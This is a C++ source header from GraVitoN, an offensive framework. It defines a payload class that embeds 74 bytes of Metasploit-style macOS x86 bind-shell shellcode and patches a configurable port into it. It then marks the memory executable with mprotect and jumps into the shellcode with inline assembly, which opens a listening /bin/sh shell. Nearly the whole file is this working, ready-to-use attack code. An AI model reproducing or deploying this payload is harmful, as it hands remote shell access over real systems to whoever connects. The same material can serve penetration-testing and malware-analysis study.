/**
 * @file
 * @author  Sina Hatef Matbue ( _null_ ) <sinahatef.cpp@gmail.com>
 *
 * @section License
 *
 * This file is part of GraVitoN.
 *
 * Graviton is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * Graviton is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with Graviton.  If not, see http://www.gnu.org/licenses/.
 *
 * @brief Payload_Osx32b
 *
*/

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
#ifndef _GVN_PAYLOAD_OSX32b_H_
#define _GVN_PAYLOAD_OSX32B_H_

#include "../gvn_payload.hpp"

#include <cstdio>
#include <cstdlib>
#include <sys/mman.h>
#include <errno.h>

using namespace GraVitoN;

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
/**
 * @brief OSX 32bit Bind Shell
 *
 * @see Payload_Sample
 */
class Payload_Osx32b : public GraVitoN::Bin_Payload
{
protected:
	virtual bool initPayload();
	
public:
    Payload_Osx32b();
    virtual ~Payload_Osx32b();

    virtual bool initialize ( const string &_options );
    virtual bool run();
};

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Osx32b::Payload_Osx32b()
{
    jumper = _null_;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
Payload_Osx32b::~Payload_Osx32b()
{
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32b::initPayload()
{
	int port = 7357;
	/// Parse options
	OptParser::getValueAsInt(options, "PORT", port);
	
    /**
    * osx/x86/shell_bind_tcp - 74 bytes \n
    * http://www.metasploit.com \n
    * VERBOSE=false, LPORT=4444, RHOST=, PrependSetresuid=false, \n
    * PrependSetreuid=false, PrependSetuid=false, \n
    * AppendExit=false, InitialAutoRunScript=, AutoRunScript= \n
    */
	
    unsigned char buf[] =
        "\x31\xc0\x50\x68\xff\x02\x11\x5c\x89\xe7\x50\x6a\x01\x6a\x02"
        "\x6a\x10\xb0\x61\xcd\x80\x57\x50\x50\x6a\x68\x58\xcd\x80\x89"
        "\x47\xec\xb0\x6a\xcd\x80\xb0\x1e\xcd\x80\x50\x50\x6a\x5a\x58"
        "\xcd\x80\xff\x4f\xe4\x79\xf6\x50\x68\x2f\x2f\x73\x68\x68\x2f"
        "\x62\x69\x6e\x89\xe3\x50\x54\x54\x53\x50\xb0\x3b\xcd\x80";
    /// Change port number
	int buf_len = 74;
	
	unsigned char up = port / 256, down = port % 256;
	buf[06] = up;
	buf[07] = down;
	
    payload_size = buf_len;
    payload = new unsigned char[payload_size];
    memcpy ( payload, buf, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32b::initialize ( const string &_options )
{
    options = _options;

    Logger::logIt ( "init payload... " );
    initPayload();
    Logger::logItLn ( "done" );

    jumper = ( void ( * ) ( void* ) ) malloc ( payload_size );
    memcpy ( ( void* ) jumper, ( void * ) payload, payload_size * sizeof ( unsigned char ) );

    return true;
}

//-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=--=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-//
bool Payload_Osx32b::run()
{
    /// Set Page Permissions
    unsigned long page = ( unsigned long ) jumper & ~ ( unsigned long ) ( getpagesize() - 1 );
    if ( mprotect ( ( unsigned char* ) page, getpagesize(), PROT_READ | PROT_WRITE | PROT_EXEC ) ) {
        Logger::logIt ( "mprotect failed - errorno: " );
        Logger::logItLn ( errno );

        return false;
    }

    // A Little Delay!
    int _delay = 320;
    while ( _delay > 0 ) {
        --_delay;
    }

    int useless_out = 0;
    Logger::logItLn ( "Jumping..." );
    asm (
        "mov %1, %%ecx;"
        "jmp *%%ecx;"
        : "=r" ( useless_out )
        : "r" ( jumper )
        : "%ecx"
    );
    Logger::logItLn ( "call > done" );

    return true;
}

#endif // _GVN_PAYLOAD_OSX32B_H_
